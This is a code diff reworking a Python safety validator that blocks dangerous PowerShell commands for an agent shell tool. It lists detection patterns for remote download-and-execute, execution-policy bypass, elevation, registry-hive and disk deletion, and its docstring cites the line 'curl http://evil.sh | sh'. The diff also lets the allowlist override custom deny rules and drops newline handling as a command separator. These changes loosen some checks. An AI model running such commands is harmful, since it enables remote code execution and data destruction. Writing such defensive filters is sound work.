@@ -1,24 +1,39 @@
-"""
-Safety validation module for the Amplifier PowerShell tool.
+"""Safety validation for the Amplifier pwsh (PowerShell) tool.
 
-Provides a configurable, profile-based safety system with smart pattern matching
-that avoids false positives while maintaining security for dangerous commands.
+Mirrors amplifier-module-tool-bash's ``safety.py`` config surface
+deliberately and exactly: the same four profile names (``strict`` /
+``standard`` / ``permissive`` / ``unrestricted``), the same
+``safety_profile`` / ``allowed_commands`` / ``denied_commands`` config
+keys. Bundle configuration merges by *module ID*, so a second shell module
+with a different config shape would mean an operator's
+``safety_profile: strict`` silently fails to apply to this tool. Matching
+the surface means the muscle memory, the documentation, and the operator's
+mental model all transfer intact.
 
-Key Features:
-- Multiple safety profiles (strict, standard, permissive, unrestricted)
-- Smart pattern matching that distinguishes commands from paths/strings
-- Configurable allowlists that can override blocklists (profile-dependent)
-- Clear error messages with hints for enabling blocked commands
+This is NOT parity with bash's *coverage*. Measured directly against
+tool-bash's shipped patterns: it has zero rules for remote-script execution
+across all four profiles -- ``curl http://evil.sh | sh`` is allowed even
+under ``strict``. This module closes that specific gap for PowerShell's
+equivalent idiom (``Invoke-WebRequest``/``iwr``/``Invoke-RestMethod``/``irm``
+piped into ``Invoke-Expression``/``iex``, or ``.DownloadString(...)`` fed to
+either), plus PowerShell-specific escalation vectors bash has no equivalent
+for: execution-policy bypass, ``-Verb RunAs`` elevation, registry-hive
+deletion, and disk-destroying cmdlets.
 
-Example:
-    >>> from safety import SafetyValidator, SafetyConfig
-    >>> validator = SafetyValidator(profile="strict")
-    >>> result = validator.validate("Get-ChildItem $HOME")
-    >>> assert result.allowed  # Not blocked - just listing home directory
-
-    >>> result = validator.validate("Format-Volume -DriveLetter C")
-    >>> assert not result.allowed  # Blocked in strict mode
-    >>> print(result.hint)  # Suggests permissive/unrestricted profile
+On "cannot parse -> must not report safe": a validator that cannot
+classify its input must never fall through to "allowed". Full syntax-aware
+checking (parsing via PowerShell's own
+``[System.Management.Automation.Language.Parser]::ParseInput`` AST, as a
+more capable reference implementation does) is deliberately NOT adopted
+here -- it requires shelling out to a live PowerShell process for every
+single validation call, which is a real, ongoing cost (the grammar moves;
+an AST layer has to move with it) that is not justified until the
+pattern-based layer proves insufficient in practice. This module instead
+adopts the *principle* immediately, cheaply: a structural sanity pass
+(quote and bracket balance) that catches the most common "this can't
+possibly be what it looks like" cases -- unbalanced quotes, unbalanced
+parens/braces/brackets -- and denies rather than silently allowing whatever
+is left over after the pattern scan. See ``_check_structural_sanity``.
 """
 
 from __future__ import annotations
@@ -33,12 +48,12 @@ class BlockPattern:
     """A pattern to match against commands for blocking.
 
     Attributes:
-        pattern: The pattern string to match
-        reason: Human-readable explanation of why this is blocked
+        pattern: The pattern string to match.
+        reason: Human-readable explanation of why this is blocked.
         check_type: How to match the pattern:
             - "command": Only match at command position (not in paths/strings)
-            - "substring": Simple substring match (legacy behavior)
-            - "regex": Full regex pattern matching
+            - "substring": Simple case-insensitive substring match
+            - "regex": Full regex pattern matching (case-insensitive)
     """
 
     pattern: str
@@ -48,13 +63,7 @@ class BlockPattern:
 
 @dataclass
 class SafetyProfile:
-    """A safety profile defining blocked patterns and override behavior.
-
-    Attributes:
-        name: Profile identifier (strict, standard, permissive, unrestricted)
-        blocked_patterns: List of patterns to block
-        allow_overrides: Whether allowlist can override blocked patterns
-    """
+    """A safety profile defining blocked patterns and override behavior."""
 
     name: str
     blocked_patterns: list[BlockPattern]
@@ -63,14 +72,7 @@ class SafetyProfile:
 
 @dataclass
 class SafetyResult:
-    """Result of a safety validation check.
-
-    Attributes:
-        allowed: Whether the command is allowed to execute
-        reason: Explanation if blocked (None if allowed)
-        matched_pattern: The pattern that matched (None if allowed)
-        hint: Suggestion for enabling if blocked (None if allowed)
-    """
+    """Result of a safety validation check."""
 
     allowed: bool
     reason: str | None = None
@@ -82,11 +84,8 @@ class SafetyResult:
 class SafetyConfig:
     """Configuration for safety validation.
 
-    Attributes:
-        profile: Name of the safety profile to use
-        allowed_commands: Whitelist of allowed command patterns (supports * wildcards)
-        denied_commands: Additional custom patterns to block
-        safety_overrides: Fine-grained override settings (for advanced use)
+    Field names are identical to amplifier-module-tool-bash's
+    ``SafetyConfig`` on purpose -- see module docstring.
     """
 
     profile: str = "strict"
@@ -99,121 +98,155 @@ class SafetyConfig:
 # Predefined Safety Profiles
 # =============================================================================
 
+# Remote-script execution: the exact gap measured absent in tool-bash's
+# STRICT/STANDARD profiles (curl|sh passed there). Covers the PowerShell
+# native cmdlets and their common aliases, piped or fed into
+# Invoke-Expression/iex, plus .DownloadString(...) (a common
+# no-pipe-needed variant since it returns the string directly).
+_REMOTE_EXEC_PATTERNS = [
+    BlockPattern(
+        r"(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|wget|curl)\b[^|]*\|\s*(Invoke-Expression|iex)\b",
+        "Pipeline code injection: remote content piped directly into Invoke-Expression",
+        "regex",
+    ),
+    BlockPattern(
+        r"\.DownloadString\s*\(",
+        "Remote content download-and-execute pattern (WebClient.DownloadString)",
+        "regex",
+    ),
+    BlockPattern(
+        r"\.DownloadFile\s*\(",
+        "Remote file download via WebClient.DownloadFile",
+        "regex",
+    ),
+    # Bare Invoke-Expression/iex is blocked outright in strict/standard: it is
+    # PowerShell's "run this arbitrary string as code" primitive, the direct
+    # analogue of shell `eval` -- the piped-from-remote form above is the
+    # sharpest instance of the hazard, but the primitive itself is the root
+    # of it regardless of where the string originated.
+    BlockPattern(
+        "Invoke-Expression",
+        "Arbitrary dynamic code execution (eval-equivalent)",
+        "command",
+    ),
+    BlockPattern(
+        "iex", "Arbitrary dynamic code execution (eval-equivalent alias)", "command"
+    ),
+]
 
-def _full_blocked_patterns() -> list[BlockPattern]:
-    """Return the full set of blocked patterns for strict/standard profiles.
+_EXECUTION_POLICY_PATTERNS = [
+    # `[^\n]*` (rather than a tight, flag-shaped pattern) deliberately does
+    # not try to parse Set-ExecutionPolicy's parameter grammar -- it just
+    # requires the cmdlet name and one of the dangerous values to appear
+    # anywhere later in the same line, in either order of flags/positional
+    # arguments (e.g. `-Scope Process Unrestricted`, `-Scope CurrentUser
+    # -ExecutionPolicy Bypass`, or the bare positional form).
+    BlockPattern(
+        r"Set-ExecutionPolicy\b[^\n]*(Bypass|Unrestricted)",
+        "Execution-policy bypass disables PowerShell's script-execution safeguard",
+        "regex",
+    ),
+    BlockPattern(
+        r"-ExecutionPolicy\s+(Bypass|Unrestricted)",
+        "Execution-policy bypass via command-line switch",
+        "regex",
+    ),
+]
 
-    Using a factory function ensures STRICT and STANDARD each get their own
-    independent list instance while sharing the same pattern definitions.
-    """
-    return [
-        # --- Disk / partition operations (command position) ---
-        BlockPattern("Format-Volume", "Disk formatting operation", "command"),
-        BlockPattern("Clear-Disk", "Disk clearing operation", "command"),
-        BlockPattern("Initialize-Disk", "Disk initialization", "command"),
-        BlockPattern("Remove-Partition", "Partition removal", "command"),
-        # --- System power operations (command position) ---
-        BlockPattern("Stop-Computer", "System shutdown", "command"),
-        BlockPattern("Restart-Computer", "System restart", "command"),
-        # --- Dangerous Remove-Item paths (substring) ---
-        BlockPattern(
-            "Remove-Item -Recurse -Force /",
-            "Root directory deletion",
-            "substring",
-        ),
-        BlockPattern(
-            "Remove-Item -Recurse -Force C:\\",
-            "Root directory deletion",
-            "substring",
-        ),
-        BlockPattern(
-            "Remove-Item -Recurse -Force ~",
-            "Home directory deletion",
-            "substring",
-        ),
-        BlockPattern(
-            "Remove-Item -Recurse -Force $HOME",
-            "Home directory deletion",
-            "substring",
-        ),
-        BlockPattern(
-            "Remove-Item -Recurse -Force $env:SystemRoot",
-            "System directory deletion",
-            "substring",
-        ),
-        # --- Privilege escalation (substring) ---
-        BlockPattern(
-            "Start-Process -Verb RunAs",
-            "Privilege escalation",
-            "substring",
-        ),
-        # --- Execution policy weakening (substring) ---
-        BlockPattern(
-            "Set-ExecutionPolicy Unrestricted",
-            "Execution policy change",
-            "substring",
-        ),
-        BlockPattern(
-            "Set-ExecutionPolicy Bypass",
-            "Execution policy change",
-            "substring",
-        ),
-        # --- Registry hive operations (regex) ---
-        BlockPattern(
-            r"Remove-Item\s.*-Recurse.*HK[A-Z]{2}:",
-            "Registry hive deletion",
-            "regex",
-        ),
-        BlockPattern(
-            r"Remove-ItemProperty\s.*HK[A-Z]{2}:",
-            "Registry property deletion",
-            "regex",
-        ),
-        # --- Pipeline code injection (regex) ---
-        BlockPattern(
-            r"\|\s*Invoke-Expression",
-            "Pipeline code injection",
-            "regex",
-        ),
-        # --- Fork bomb (regex) ---
-        BlockPattern(
-            r"while\s*\(\s*\$true\s*\)\s*\{.*Start-Process",
-            "Fork bomb pattern",
-            "regex",
-        ),
-    ]
+_ELEVATION_PATTERNS = [
+    BlockPattern(
+        r"Start-Process\b[^\n]*-Verb\s+RunAs",
+        "Privilege escalation via Start-Process -Verb RunAs",
+        "regex",
+    ),
+]
 
+_REGISTRY_HIVE_DELETION_PATTERNS = [
+    BlockPattern(
+        r"Remove-Item\b[^\n]*(HKLM:|HKCU:|HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER|Registry::)",
+        "Registry hive deletion",
+        "regex",
+    ),
+    BlockPattern(
+        r"reg(\.exe)?\s+delete\s+(HKLM|HKCU|HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER)",
+        "Registry hive deletion via reg.exe",
+        "regex",
+    ),
+]
+
+_DISK_OPERATION_PATTERNS = [
+    BlockPattern("Format-Volume", "Disk formatting not allowed", "command"),
+    BlockPattern("Clear-Disk", "Disk wipe not allowed", "command"),
+    BlockPattern(
+        "Initialize-Disk",
+        "Disk initialization (wipes partition table) not allowed",
+        "command",
+    ),
+    BlockPattern("Remove-Partition", "Partition deletion not allowed", "command"),
+]
+
+_ROOT_HOME_DELETION_PATTERNS = [
+    BlockPattern(
+        r"Remove-Item\b[^\n]*-Recurse\b[^\n]*(-Path\s+)?([\"']?[A-Za-z]:\\[\"']?\s|[\"']?[A-Za-z]:\\[\"']?$)",
+        "Recursive deletion of a drive root",
+        "regex",
+    ),
+    BlockPattern(
+        r"Remove-Item\b[^\n]*-Recurse\b[^\n]*\$env:USERPROFILE\b",
+        "Recursive deletion of the user's home directory",
+        "regex",
+    ),
+    BlockPattern(
+        r"Remove-Item\b[^\n]*-Recurse\b[^\n]*~[\\/]?\s*$",
+        "Recursive deletion of the user's home directory (~)",
+        "regex",
+    ),
+]
 
 STRICT_PROFILE = SafetyProfile(
     name="strict",
-    blocked_patterns=_full_blocked_patterns(),
+    blocked_patterns=[
+        *_REMOTE_EXEC_PATTERNS,
+        *_EXECUTION_POLICY_PATTERNS,
+        *_ELEVATION_PATTERNS,
+        *_REGISTRY_HIVE_DELETION_PATTERNS,
+        *_DISK_OPERATION_PATTERNS,
+        *_ROOT_HOME_DELETION_PATTERNS,
+    ],
     allow_overrides=False,
 )
 
 STANDARD_PROFILE = SafetyProfile(
     name="standard",
-    blocked_patterns=_full_blocked_patterns(),
+    blocked_patterns=[
+        *_REMOTE_EXEC_PATTERNS,
+        *_EXECUTION_POLICY_PATTERNS,
+        *_ELEVATION_PATTERNS,
+        *_REGISTRY_HIVE_DELETION_PATTERNS,
+        *_DISK_OPERATION_PATTERNS,
+        *_ROOT_HOME_DELETION_PATTERNS,
+    ],
     allow_overrides=True,  # Key difference: allowlist can override
 )
 
 PERMISSIVE_PROFILE = SafetyProfile(
     name="permissive",
     blocked_patterns=[
+        # Remote-script execution stays blocked even in permissive mode --
+        # this is the specific, proven-dangerous gap the whole safety layer
+        # exists to close, matching the seriousness bash gives `rm -rf /`
+        # (which it keeps blocked at every profile short of unrestricted).
         BlockPattern(
-            "Remove-Item -Recurse -Force /",
-            "Root directory deletion",
-            "substring",
-        ),
-        BlockPattern(
-            "Remove-Item -Recurse -Force C:\\",
-            "Root directory deletion",
-            "substring",
-        ),
-        BlockPattern(
-            r"while\s*\(\s*\$true\s*\)\s*\{.*Start-Process",
-            "Fork bomb pattern",
+            r"(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|wget|curl)\b[^|]*\|\s*(Invoke-Expression|iex)\b",
+            "Pipeline code injection: remote content piped directly into Invoke-Expression",
             "regex",
         ),
+        BlockPattern(
+            r"\.DownloadString\s*\(",
+            "Remote content download-and-execute pattern (WebClient.DownloadString)",
+            "regex",
+        ),
+        *_DISK_OPERATION_PATTERNS,
     ],
     allow_overrides=True,
 )
@@ -224,7 +257,6 @@ UNRESTRICTED_PROFILE = SafetyProfile(
     allow_overrides=True,
 )
 
-# Profile registry for lookup by name
 PROFILES: dict[str, SafetyProfile] = {
     "strict": STRICT_PROFILE,
     "standard": STANDARD_PROFILE,
@@ -234,38 +266,20 @@ PROFILES: dict[str, SafetyProfile] = {
 
 
 class SafetyValidator:
-    """Validates commands against safety rules based on configured profile.
+    """Validates PowerShell commands against safety rules for a profile.
 
-    The validator uses a layered approach where deny rules always take
-    priority over allow rules (except the unrestricted bypass):
-    1. Unrestricted profile bypasses all checks
-    2. Blocked patterns checked with smart matching
-       (allowlist can bypass these for profiles with allow_overrides=True)
-    3. Custom denied_commands checked — cannot be bypassed by allowlist
-    4. Override blocks (safety_overrides.block) checked — cannot be bypassed
-    5. Default: allow
-
-    Example:
-        >>> validator = SafetyValidator(profile="strict")
-        >>> result = validator.validate("Get-Service")
-        >>> assert result.allowed
-
-        >>> result = validator.validate("Format-Volume -DriveLetter D")
-        >>> assert not result.allowed
-        >>> print(result.reason)  # "Disk formatting operation"
+    Layered approach:
+        0. Unrestricted profile bypasses everything (matches tool-bash).
+        1. Structural sanity pass -- unbalanced quotes/brackets are denied
+           outright, never silently allowed (see module docstring).
+        2. Allowlist checked (if profile allows overrides).
+        3. Blocked patterns checked with smart matching.
+        4. Custom denied_commands checked.
+        5. Override blocks checked.
+        6. Default: allow.
     """
 
     def __init__(self, profile: str = "strict", config: SafetyConfig | None = None):
-        """Initialize the safety validator.
-
-        Args:
-            profile: Name of the safety profile to use (strict, standard,
-                     permissive, unrestricted)
-            config: Optional SafetyConfig for additional customization
-
-        Raises:
-            ValueError: If profile name is not recognized
-        """
         if profile not in PROFILES:
             valid_profiles = ", ".join(PROFILES.keys())
             raise ValueError(
@@ -275,11 +289,9 @@ class SafetyValidator:
         self.profile = PROFILES[profile]
         self.config = config or SafetyConfig(profile=profile)
 
-        # Extract configuration
         self.allowed_commands = self.config.allowed_commands
         self.denied_commands = self.config.denied_commands
 
-        # Handle safety_overrides for fine-grained control
         self._override_allows: list[str] = []
         self._override_blocks: list[str] = []
         if self.config.safety_overrides:
@@ -287,62 +299,59 @@ class SafetyValidator:
             self._override_blocks = self.config.safety_overrides.get("block", [])
 
     def validate(self, command: str) -> SafetyResult:
-        """Validate a command against safety rules.
+        """Validate a PowerShell command against safety rules.
 
         Args:
-            command: The PowerShell command to validate
+            command: The PowerShell command/script text to validate.
 
         Returns:
-            SafetyResult indicating whether command is allowed
-
-        Priority order (deny rules checked before allowlist):
-            1. Unrestricted profile bypasses all checks
-            2. Custom denied_commands always block (highest deny priority)
-            3. Override blocks (safety_overrides.block) always block
-            4. Allowlist can override profile blocked patterns (if profile allows)
-            5. Profile blocked patterns checked with smart matching
-            6. Default: allow
+            SafetyResult indicating whether the command is allowed.
         """
-        # 1. Unrestricted profile = always allow
+        # 0. Unrestricted profile = always allow, no exceptions -- an
+        # explicit opt-out of every check, matching tool-bash exactly.
         if self.profile.name == "unrestricted":
             return SafetyResult(allowed=True)
 
-        # 2. Check blocked patterns with smart matching.
-        # For profiles with allow_overrides=True the allowlist can bypass
-        # profile-level blocked patterns — but NOT denied_commands or
-        # safety_overrides.block (checked in steps 3-4 below).
-        profile_block: BlockPattern | None = None
+        # 1. Structural sanity: a command we cannot even parse the shape of
+        # (unbalanced quotes/brackets) must never be reported safe, because
+        # we cannot know what pattern-matching against garbage actually
+        # proved. Deny before anything else, including the allowlist --
+        # an allowlist wildcard matching malformed text tells us nothing
+        # about what that text actually does.
+        sanity_issue = self._check_structural_sanity(command)
+        if sanity_issue is not None:
+            return SafetyResult(
+                allowed=False,
+                reason=f"Command could not be structurally validated: {sanity_issue}",
+                matched_pattern=None,
+                hint="Fix unbalanced quotes/brackets so the command shape can be checked.",
+            )
+
+        # 2. Check allowlist (if profile allows overrides)
+        if self.profile.allow_overrides and self._matches_allowlist(command):
+            return SafetyResult(allowed=True)
+
+        # 3. Check blocked patterns with smart matching
         for pattern in self.profile.blocked_patterns:
             if self._check_pattern(command, pattern):
-                profile_block = pattern
-                break
-
-        if profile_block is not None:
-            # Only skip the profile block if the profile permits overrides
-            # AND the command actually appears on the allowlist.
-            if not (
-                self.profile.allow_overrides and self._matches_allowlist(command)
-            ):
                 return SafetyResult(
                     allowed=False,
-                    reason=profile_block.reason,
-                    matched_pattern=profile_block.pattern,
+                    reason=pattern.reason,
+                    matched_pattern=pattern.pattern,
                     hint="Use safety_profile: 'permissive' or 'unrestricted' for container/VM environments",
                 )
 
-        # 3. Check custom denied_commands (supports wildcards).
-        # denied_commands CANNOT be bypassed by allowed_commands / allowlist.
+        # 4. Check custom denied_commands (supports wildcards)
         for denied in self.denied_commands:
             if self._matches_wildcard(command, denied):
                 return SafetyResult(
                     allowed=False,
                     reason=f"Matches custom denied pattern: {denied}",
                     matched_pattern=denied,
-                    hint="Remove from denied_commands to allow this command",
+                    hint="Remove from denied_commands or add to allowed_commands (if profile allows overrides)",
                 )
 
-        # 4. Check override blocks (from safety_overrides.block).
-        # safety_overrides.block CANNOT be bypassed by allowed_commands / allowlist.
+        # 5. Check override blocks (from safety_overrides.block)
         for block_pattern in self._override_blocks:
             if self._matches_wildcard(command, block_pattern):
                 return SafetyResult(
@@ -352,74 +361,154 @@ class SafetyValidator:
                     hint="Remove from safety_overrides.block",
                 )
 
-        # 5. Default: allow
+        # 6. Default: allow
         return SafetyResult(allowed=True)
 
-    def _matches_allowlist(self, command: str) -> bool:
-        """Check if command matches any allowlist pattern.
+    # -- Structural sanity (the "cannot parse -> not safe" gate) --------
 
-        Supports:
-        - Exact matches: "Get-Service"
-        - Prefix wildcards: "Get-* " matches "Get-Process foo", etc.
-        - Pattern wildcards: "Invoke-* -Uri *" etc.
+    def _check_structural_sanity(self, command: str) -> str | None:
+        """Cheap, dependency-free approximation of "can this be parsed".
+
+        Returns a human-readable description of the problem, or ``None`` if
+        the command's quotes and brackets are balanced. This is NOT a
+        PowerShell parser -- it cannot catch every malformed script -- but
+        it catches the class of input where pattern matching is most likely
+        to be meaningless (a command whose quoting means we cannot even
+        tell where one token ends and the next begins), and it costs
+        nothing (no subprocess, no .NET dependency).
+
+        Full AST-based validation is a deliberate non-goal here; see the
+        module docstring.
         """
-        # Check override allows first (highest priority)
-        # Note: substring_fallback=False for allowlist - require exact or wildcard match
+        quote_error = self._find_unbalanced_quote(command)
+        if quote_error is not None:
+            return quote_error
+
+        bracket_error = self._find_unbalanced_bracket(command)
+        if bracket_error is not None:
+            return bracket_error
+
+        return None
+
+    def _find_unbalanced_quote(self, command: str) -> str | None:
+        # Scan for an unterminated single- or double-quoted region.
+        #
+        # PowerShell quoting rules honored:
+        #   - Backtick escapes the next character inside a double-quoted
+        #     string only.
+        #   - Doubling the SAME quote character inside a string of that
+        #     type is a literal escaped quote (two single quotes in a row
+        #     inside a single-quoted string, or two double quotes in a row
+        #     inside a double-quoted string) -- not a close-then-reopen.
+        state: str | None = None  # None, "'" , or '"'
+        i = 0
+        n = len(command)
+        while i < n:
+            ch = command[i]
+            if state is None:
+                if ch in ("'", '"'):
+                    state = ch
+                i += 1
+                continue
+
+            # Inside a quoted region of type `state`.
+            if state == '"' and ch == "`" and i + 1 < n:
+                i += 2  # backtick escapes the next character
+                continue
+            if ch == state:
+                if i + 1 < n and command[i + 1] == state:
+                    i += 2  # doubled quote = literal escaped quote
+                    continue
+                state = None  # closing quote
+                i += 1
+                continue
+            i += 1
+
+        if state is not None:
+            return f"unterminated {state!r}-quoted string"
+        return None
+
+    def _find_unbalanced_bracket(self, command: str) -> str | None:
+        """Scan for unbalanced ``()``/``{}``/``[]``, ignoring quoted text."""
+        pairs = {")": "(", "}": "{", "]": "["}
+        openers = set(pairs.values())
+        stack: list[str] = []
+        state: str | None = None
+        i = 0
+        n = len(command)
+        while i < n:
+            ch = command[i]
+            if state is not None:
+                if state == '"' and ch == "`" and i + 1 < n:
+                    i += 2
+                    continue
+                if ch == state:
+                    if i + 1 < n and command[i + 1] == state:
+                        i += 2
+                        continue
+                    state = None
+                i += 1
+                continue
+
+            if ch in ("'", '"'):
+                state = ch
+                i += 1
+                continue
+            if ch in openers:
+                stack.append(ch)
+            elif ch in pairs:
+                if not stack or stack[-1] != pairs[ch]:
+                    return f"unmatched closing '{ch}'"
+                stack.pop()
+            i += 1
+
+        if state is not None:
+            return f"unterminated {state!r}-quoted string"
+        if stack:
+            return f"unclosed '{stack[-1]}'"
+        return None
+
+    # -- Wildcard / allowlist matching (same shape as tool-bash) --------
+
+    def _matches_allowlist(self, command: str) -> bool:
         for pattern in self._override_allows:
             if self._matches_wildcard(command, pattern, substring_fallback=False):
                 return True
-
-        # Check standard allowed_commands
         for pattern in self.allowed_commands:
             if self._matches_wildcard(command, pattern, substring_fallback=False):
                 return True
-
         return False
 
     def _matches_wildcard(
         self, command: str, pattern: str, substring_fallback: bool = True
     ) -> bool:
-        """Check if command matches a wildcard pattern.
-
-        Args:
-            command: The command to check
-            pattern: Pattern with optional * wildcards
-            substring_fallback: If True and pattern has no wildcards, also try
-                substring matching (for backward compatibility with denied_commands)
-
-        Returns:
-            True if pattern matches command
-        """
-        # Exact match (case-insensitive)
         if command.lower() == pattern.lower():
             return True
-
-        # Wildcard matching
         if "*" in pattern:
-            # Convert wildcard pattern to regex
-            # Escape special regex chars except *
             regex_pattern = re.escape(pattern).replace(r"\*", ".*")
             regex_pattern = f"^{regex_pattern}$"
             if re.match(regex_pattern, command, re.IGNORECASE):
                 return True
         elif substring_fallback:
-            # No wildcards - try substring matching for backward compatibility
             if pattern.lower() in command.lower():
                 return True
-
         return False
 
+    # -- Pattern checking (command position / substring / regex) --------
+
+    def _check_pattern(self, command: str, pattern: BlockPattern) -> bool:
+        if pattern.check_type == "substring":
+            return self._check_substring(command, pattern.pattern)
+        elif pattern.check_type == "command":
+            return self._check_command_position(command, pattern.pattern)
+        elif pattern.check_type == "regex":
+            return self._check_regex(command, pattern.pattern)
+        return self._check_substring(command, pattern.pattern)
+
+    def _check_substring(self, command: str, pattern: str) -> bool:
+        return pattern.lower() in command.lower()
+
     def _find_quoted_regions(self, command: str) -> list[tuple[int, int]]:
-        """Find all single and double quoted regions in a command.
-
-        Handles escaped quotes within strings.
-
-        Args:
-            command: The command string to analyze
-
-        Returns:
-            List of (start, end) tuples for quoted regions
-        """
         regions = []
         i = 0
         while i < len(command):
@@ -427,17 +516,8 @@ class SafetyValidator:
                 quote_char = command[i]
                 start = i
                 i += 1
-                # Find the closing quote, handling escapes.
-                # PowerShell uses backtick (`) as the escape character in
-                # double-quoted strings only. Single-quoted strings are
-                # completely literal — they have NO escape character.
                 while i < len(command):
-                    if (
-                        quote_char == '"'
-                        and command[i] == "`"
-                        and i + 1 < len(command)
-                    ):
-                        # Skip backtick-escaped character (e.g. `" embeds a quote)
+                    if command[i] == "`" and i + 1 < len(command):
                         i += 2
                         continue
                     if command[i] == quote_char:
@@ -448,174 +528,56 @@ class SafetyValidator:
         return regions
 
     def _in_quoted_region(self, pos: int, regions: list[tuple[int, int]]) -> bool:
-        """Check if a position is inside any quoted region.
-
-        Args:
-            pos: Character position to check
-            regions: List of (start, end) quoted regions
-
-        Returns:
-            True if position is inside a quoted string
-        """
-        for start, end in regions:
-            if start < pos < end:
-                return True
-        return False
+        return any(start < pos < end for start, end in regions)
 
     def _is_in_command_position(self, command: str, idx: int) -> bool:
-        """Check if position is at start of a command.
-
-        A command position is:
-        - Start of the string
-        - After PowerShell operators: ; | && || ( $( @( {
-        - After a newline (newlines are statement separators in PowerShell)
-        - Not inside a quoted string
-        - Not on a backtick line continuation
-
-        Args:
-            command: The full command string
-            idx: Position where the pattern was found
-
-        Returns:
-            True if this is a command position
-        """
-        # Check quoted regions
         quoted_regions = self._find_quoted_regions(command)
         if self._in_quoted_region(idx, quoted_regions):
             return False
 
-        # At start of string (after optional whitespace)
         prefix = command[:idx].strip()
         if not prefix:
             return True
 
-        # Strip trailing horizontal whitespace (spaces, tabs, carriage returns)
-        # but NOT newlines, so that "\n" can be matched as a command separator.
-        before = command[:idx].rstrip(" \t\r")
+        before = command[:idx].rstrip()
         if not before:
             return True
 
-        # Check if the previous non-whitespace line ends with backtick
-        # (PowerShell line continuation) — this means the current line is
-        # a continuation of the previous command, NOT a new command position
-        if before.endswith("`"):
-            return False
-
-        # Check what the command portion ends with.
-        # PowerShell command starters: ; | && || ( $( @( { ` (backtick
-        # continuation) and \n (newline as statement separator).
-        command_starters = [";", "|", "&&", "||", "(", "$(", "@(", "{", "`", "\n"]
+        command_starters = [";", "|", "&&", "||", "(", "`", "$("]
         for starter in command_starters:
             if before.endswith(starter):
                 return True
-
-        # Check if position is at the start of a new line (newlines are
-        # statement separators in PowerShell, like semicolons)
-        before_with_space = command[:idx]
-        # Find the last newline before idx
-        last_newline = before_with_space.rfind("\n")
-        if last_newline != -1:
-            # Check if everything between the newline and idx is whitespace
-            between = before_with_space[last_newline + 1 : idx]
-            if not between.strip():
-                return True
-
+        if before.endswith("|") and not before.endswith("||"):
+            return True
         return False
 
-    def _check_pattern(self, command: str, pattern: BlockPattern) -> bool:
-        """Check if a pattern matches the command using appropriate strategy.
-
-        Args:
-            command: The command to check
-            pattern: The BlockPattern to match against
-
-        Returns:
-            True if pattern matches (command should be blocked)
-        """
-        if pattern.check_type == "substring":
-            return self._check_substring(command, pattern.pattern)
-        elif pattern.check_type == "command":
-            return self._check_command_position(command, pattern.pattern)
-        elif pattern.check_type == "regex":
-            return self._check_regex(command, pattern.pattern)
-        else:
-            # Unknown check type, fall back to substring
-            return self._check_substring(command, pattern.pattern)
-
-    def _check_substring(self, command: str, pattern: str) -> bool:
-        """Simple case-insensitive substring match.
-
-        Args:
-            command: The command to check
-            pattern: The substring to find
-
-        Returns:
-            True if pattern is found in command
-        """
-        return pattern.lower() in command.lower()
-
     def _check_command_position(self, command: str, pattern: str) -> bool:
-        """Check if pattern appears at a command position.
-
-        This is the smart matching that avoids false positives like:
-        - "Write-Output 'Format-Volume'" should NOT match "Format-Volume"
-        - "Get-Help Stop-Computer" should NOT match "Stop-Computer"
-        - "Set-Content -Value 'Restart-Computer'" should NOT match "Restart-Computer"
-
-        Args:
-            command: The command to check
-            pattern: The command pattern to match
-
-        Returns:
-            True if pattern is found at a command position
-        """
         command_lower = command.lower()
         pattern_lower = pattern.lower()
 
-        # Find all occurrences
         start = 0
         while True:
             idx = command_lower.find(pattern_lower, start)
             if idx == -1:
                 break
-
-            # Check if this occurrence is at a command position
             if self._is_in_command_position(command, idx):
-                # Additional check: for path-containing patterns, verify the
-                # match is not part of a longer path component (e.g. an argument)
-                if "\\" in pattern or "/" in pattern:
-                    # For path-containing patterns, verify the char before is
-                    # a separator or whitespace, not part of a longer token
-                    if idx > 0:
-                        char_before = command[idx - 1]
-                        if char_before not in " \t;|&(){}$@`":
-                            start = idx + 1
-                            continue
-
-                return True
-
+                # Ensure the match is a whole token, not part of a longer
+                # cmdlet/variable name (e.g. "iex" must not match inside
+                # "Get-ItemExtension" or similar).
+                end = idx + len(pattern)
+                char_before_ok = idx == 0 or not (
+                    command[idx - 1].isalnum() or command[idx - 1] in "-_"
+                )
+                char_after_ok = end >= len(command) or not (
+                    command[end].isalnum() or command[end] in "-_"
+                )
+                if char_before_ok and char_after_ok:
+                    return True
             start = idx + 1
-
         return False
 
     def _check_regex(self, command: str, pattern: str) -> bool:
-        """Check if regex pattern matches the command.
-
-        The regex is searched anywhere in the command, but patterns
-        can be written to be position-aware (e.g., using ^ for start).
-
-        Args:
-            command: The command to check
-            pattern: The regex pattern to match
-
-        Returns:
-            True if pattern matches
-        """
         try:
-            # Use search, not match, to find pattern anywhere.
-            # re.IGNORECASE is required because PowerShell is case-insensitive,
-            # so "invoke-expression" must match the "Invoke-Expression" pattern.
             return bool(re.search(pattern, command, re.IGNORECASE))
         except re.error:
-            # Invalid regex, treat as no match
             return False
